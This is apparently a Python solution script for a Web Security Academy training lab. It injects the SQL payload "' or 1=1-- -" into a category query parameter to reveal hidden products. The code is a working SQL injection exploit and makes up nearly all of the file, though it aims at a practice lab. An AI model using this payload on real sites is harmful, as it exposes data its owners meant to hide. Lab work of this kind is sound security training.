#####################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 12/9/2023
#
# Lab: SQL injection vulnerability in WHERE clause allowing
#      retrieval of hidden data
#
# Steps: 1. Inject payload in 'category' query parameter
#        2. Retrieve all products without filtering
#
#####################################################################


###########
# imports
###########
import requests
from colorama import Fore


#########
# Main
#########

# change this to your lab URL
url = "https://0a9400c4037364ee815b85650053006b.web-security-academy.net" 

# payload to retrieve hidden data
payload = "' or 1=1-- -"

try:
    # fetch the page with the injected payload
    injection = requests.get(f"{url}/filter?category={payload}")
    
except:
    print(Fore.RED + "[!] Failed to inject the payload through exception")
    exit(1)

print(Fore.WHITE + "1. Injecting payload in 'category' query parameter.. " + Fore.GREEN + "OK")

# if response is OK
if injection.status_code == 200:
    print(Fore.WHITE + "2. Retrieving all products without filtering.. " + Fore.GREEN + "OK")
    print(Fore.WHITE + "ðŸ—¹ The lab should be marked now as " + Fore.GREEN + "solved")

else:
    print(Fore.RED + "[!] Failed to inject the payload")

